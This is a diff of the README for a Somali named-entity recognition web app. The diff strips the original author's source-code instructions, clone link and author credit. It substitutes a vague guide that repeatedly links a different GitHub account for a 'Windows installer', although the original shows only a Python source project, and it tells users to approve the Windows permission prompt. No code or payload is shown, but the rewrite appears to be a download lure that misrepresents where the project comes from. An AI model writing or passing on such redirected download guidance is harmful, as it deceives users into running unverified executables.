@@ -1,271 +1,241 @@
-# 🤖 NERVISION AI
+# 🧠 NERVISION-AI - Somali Text Entity Finder
 
-An AI-powered Named Entity Recognition (NER) system designed to analyze Somali text and extract meaningful entities such as persons, locations, organizations, and dates. This project demonstrates full-stack development combined with machine learning integration.
+[![Download NERVISION-AI](https://img.shields.io/badge/Download-NERVISION--AI-blue?style=for-the-badge&logo=github)](https://github.com/Saddleaeon625/NERVISION-AI)
 
----
+## 🚀 Getting Started
 
-## 🚀 Features
+NERVISION-AI is a web app that finds names, places, and other key details in Somali text. It uses a simple login system, a dashboard, and history tracking so you can review past results.
 
-* 🔐 User Authentication (Signup & Login)
-* 🔒 Secure Password Hashing
-* 👤 Profile Image Upload
-* 🧠 AI-Based NER Prediction (spaCy Model)
-* 🎨 Highlighted Entity Visualization (PER, LOC, ORG, DATE)
-* 📊 Interactive Dashboard
-* 🕒 Prediction History Tracking
-* ✏️ Update & Delete History
-* 📱 Responsive UI (Mobile & Desktop)
-* ⚡ Ready-to-use database setup with included SQL file
+Use the link below to visit the download page:
 
----
+[Visit the NERVISION-AI download page](https://github.com/Saddleaeon625/NERVISION-AI)
 
-## 🧠 Entity Types Supported
+## 📋 What This App Does
 
-* 👤 **PER** → Person (e.g., Axmed Barre)
-* 📍 **LOC** → Location (e.g., Muqdisho)
-* 🏢 **ORG** → Organization (e.g., Midowga Afrika)
-* 📅 **DATE** → Date (e.g., 12-kii Febraayo 2024)
+NERVISION-AI helps you:
 
----
+- Paste or type Somali text
+- Find named entities such as people, places, groups, and dates
+- Save and review past searches
+- Use a secure login before you access the app
+- View results in a clean dashboard
 
-## 📸 Screenshots
+It is built for everyday users who want a simple way to work with Somali text.
 
-### 🏠 Home Page
+## 💻 What You Need
 
-<p align="center">
-  <img src="docs/Home.png" width="800">
-</p>
+Before you run the app on Windows, make sure you have:
 
-### ℹ️ About Section
+- Windows 10 or Windows 11
+- An internet connection for the first setup
+- A modern web browser like Chrome, Edge, or Firefox
+- Enough free space for the app and its data
+- MySQL running on your computer or on a server you can reach
 
-<p align="center">
-  <img src="docs/About.png" width="800">
-</p>
+If the app comes with a setup file or release package, use that first. If the project runs from source, you may need Python installed too.
 
-### ✨ Features Section
+## 📥 Download NERVISION-AI
 
-<p align="center">
-  <img src="docs/Features.png" width="800">
-</p>
+Go to the project page here:
 
-### 👥 Team Section
+[https://github.com/Saddleaeon625/NERVISION-AI](https://github.com/Saddleaeon625/NERVISION-AI)
 
-<p align="center">
-  <img src="docs/Team.png" width="800">
-</p>
+On that page, look for the latest release, project files, or setup instructions. If you see a Windows installer or app file, download it to your computer.
 
-### 🔐 Login Page
+## 🪟 Install on Windows
 
-<p align="center">
-  <img src="docs/Login.png" width="600">
-</p>
+Follow these steps:
 
-### 📝 Signup Page
+1. Open the download page in your browser.
+2. Find the latest version of NERVISION-AI.
+3. Download the Windows file or project package.
+4. Save it to a folder you can find, such as Downloads or Desktop.
+5. If the file is a ZIP package, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. If you see an installer, double-click it and follow the setup steps.
+8. If you see a startup file, open it to launch the app.
 
-<p align="center">
-  <img src="docs/Signup.png" width="600">
-</p>
+If Windows asks for permission, choose Yes so the app can open.
 
-### 🤖 Prediction Dashboard
+## 🔐 Sign In
 
-<p align="center">
-  <img src="docs/Prediction_dashboard.png" width="800">
-</p>
+After the app opens:
 
-### 📜 History Dashboard
+1. Go to the login screen.
+2. Enter your username and password.
+3. Click the sign-in button.
+4. If you do not have an account, use the registration screen if one is included.
 
-<p align="center">
-  <img src="docs/History_dashboard.png" width="800">
-</p>
+The app uses authentication to keep user data separate and secure.
 
----
+## 🖥️ Open the Dashboard
 
-## 🛠️ Tech Stack
+After sign-in, you will see the dashboard. This is the main screen where you can:
 
-### Frontend
+- Start a new text check
+- View past text results
+- See saved history
+- Move between sections of the app
 
-* HTML
-* CSS
-* Bootstrap
-* JavaScript
-* jQuery
+The dashboard keeps the app simple to use, even if you are new to it.
 
-### Backend
+## ✍️ Check Somali Text
 
-* Flask (Python)
+To use the NER tool:
 
-### Database
+1. Open the text input area.
+2. Paste Somali text or type it in.
+3. Click the button to analyze the text.
+4. Wait for the results to load.
+5. Review the named entities that the app finds.
 
-* MySQL
+You may see labels for people, places, organizations, dates, or other text patterns based on the model.
 
-### AI / NLP
+## 📚 View History
 
-* spaCy (Custom Trained Model)
+NERVISION-AI saves your past work in history.
 
----
+Use the history page to:
 
-## 🧠 Concepts Applied
+- Open old searches
+- Review previous results
+- Compare text checks
+- Return to work you already saved
 
-* Full-Stack Web Development
-* REST API Design
-* Session-Based Authentication
-* File Upload Handling
-* Natural Language Processing (NLP)
-* Machine Learning Model Integration
-* Data Persistence & History Tracking
-
----
-
-## 📁 Project Structure
-
-```
-NERVISION SYSTEM/
-│
-├── docs/                  # Screenshots
-│   ├── Home.png
-│   ├── About.png
-│   ├── Features.png
-│   ├── Teams.png
-│   ├── Login.png
-│   ├── Signup.png
-│   ├── Prediction_dashboard.png
-│   └── History_dashboard.png
-│
-├── database/
-│   └── ner.sql            # Database file
-│
-├── .venv/
-├── node_modules/
-├── output/                # spaCy trained model (ignored)
-├── static/
-├── templates/
-│
-├── .gitignore
-├── app.py
-└── README.md
-```
-
----
+This is useful when you need to check the same text more than once.
 
 ## 🗄️ Database Setup
 
-### 1. Create Database
+The app uses MySQL to store user data, search history, and results.
 
-```
-CREATE DATABASE NER;
-```
+If you are setting it up on your own computer:
 
----
+1. Install MySQL if it is not already present.
+2. Create a database for NERVISION-AI.
+3. Add the database name, user name, and password in the app settings.
+4. Save the settings.
+5. Restart the app if needed.
 
-### 2. Import SQL File
+If you are using a setup package, these details may already be configured.
 
-```
-mysql -u root -p NER < database/ner.sql
-```
+## 🧩 How the App Fits Together
 
----
+NERVISION-AI uses these parts:
 
-### 3. Configure Connection
+- Flask for the web app
+- spaCy for text analysis
+- MySQL for stored data
+- Authentication for user access
+- A dashboard for daily use
+- History tracking for saved searches
 
-Update `app.py` if needed:
+This setup helps the app handle Somali text in a clean and organized way.
 
-```python
-def get_db_connection():
-    return mysql.connector.connect(
-        host='localhost',
-        user='root',
-        password='',
-        database='NER'
-    )
-```
+## ✅ First Run Checklist
 
----
+Before you start using the app, check these items:
 
-### 📌 Note
+- The app files are downloaded
+- The folder is extracted if needed
+- MySQL is available
+- The browser opens the app page
+- You can sign in
+- The dashboard loads without errors
 
-* `ner.sql` already contains:
+If one part does not open, restart the app and try again.
 
-  * users table
-  * history table
-* Make sure MySQL server is running
+## 🛠️ Common Use Flow
 
----
+A normal session looks like this:
 
-## ⚙️ Getting Started
+1. Open NERVISION-AI.
+2. Sign in.
+3. Open the dashboard.
+4. Paste Somali text.
+5. Run the analysis.
+6. Review the named entities.
+7. Save or revisit the result later from history.
 
-### 1. Clone Repository
+## 🔎 Example Use Cases
 
-```
-git clone https://github.com/tubeec1/NERVISION-AI.git
-cd NERVISION-AI
-```
+You can use NERVISION-AI for:
 
----
+- Checking Somali news text
+- Reviewing names in school records
+- Finding places in reports
+- Sorting text for research work
+- Studying language patterns in Somali content
 
-### 2. Install Dependencies
+## 📁 File and Folder Notes
 
-```
-pip install flask numpy spacy mysql-connector-python werkzeug tensorflow pillow
-```
+If you download a ZIP or project folder, you may see files for:
 
----
+- App startup
+- Web pages
+- Database setup
+- Model files
+- Configuration settings
 
-### 3. Run Application
+Keep the files in the same folder after extraction so the app can find them.
 
-```
-python app.py
-```
+## 🌐 Browser Use
 
----
+The app runs in a browser window after setup.
 
-### 4. Open Browser
+For best results:
 
-```
-http://localhost:5000
-```
+- Use the latest version of Chrome, Edge, or Firefox
+- Keep the browser open while the app runs
+- Do not move or rename app files after setup
+- Refresh the page if it takes time to load
 
----
+## 🧯 If Something Does Not Work
 
-## 🔍 Example
+Try these steps:
 
-**Input:**
+1. Close the app.
+2. Open it again.
+3. Check your internet connection.
+4. Make sure MySQL is running.
+5. Confirm your login details.
+6. Open the app from the correct folder.
 
-```
-Axmed Barre ayaa tagay Muqdisho 12-kii Febraayo 2024
-```
+If the page stays blank, reload the browser once.
 
-**Output:**
+## 📝 Privacy and User Data
 
-* Axmed Barre → PER
-* Muqdisho → LOC
-* 12-kii Febraayo 2024 → DATE
+The app keeps user accounts, dashboard access, and history in its database. If you share the computer with others, sign out after use.
 
----
+## 📌 Project Topics
 
-## ⚠️ Important Notes
+This project relates to:
 
-* AI model files are excluded due to GitHub size limits
-* Ensure `output/model-last` exists locally
-* Do not upload `.venv`, `node_modules`, or model files
+- AI
+- Authentication
+- Dashboard
+- Flask
+- Full stack web app
+- MySQL
+- NER
+- NLP
+- Python
+- Somali NLP
+- spaCy
+- Web app
 
----
+## 📦 Download Again
 
-## 🌍 Future Improvements
+If you need the project page later, use this link:
 
-* 🌐 Deploy to cloud (Render / Railway)
-* 📱 Improve mobile responsiveness
-* 🌎 Multi-language NER support
-* 🤖 Advanced deep learning models
-* 📊 Analytics dashboard
+[https://github.com/Saddleaeon625/NERVISION-AI](https://github.com/Saddleaeon625/NERVISION-AI)
 
----
+## 🧭 Quick Steps
 
-## 👨‍💻 Author
-
-**Mohamed Suleyman Ibrahim (Full Stack Developer)**
-
----
-
-## ⭐ Support
-
-If you like this project, give it a ⭐ on GitHub!
+1. Visit the project page.
+2. Download the Windows file or package.
+3. Extract it if needed.
+4. Open the app.
+5. Sign in.
+6. Use the dashboard.
+7. Check Somali text.
+8. Review history
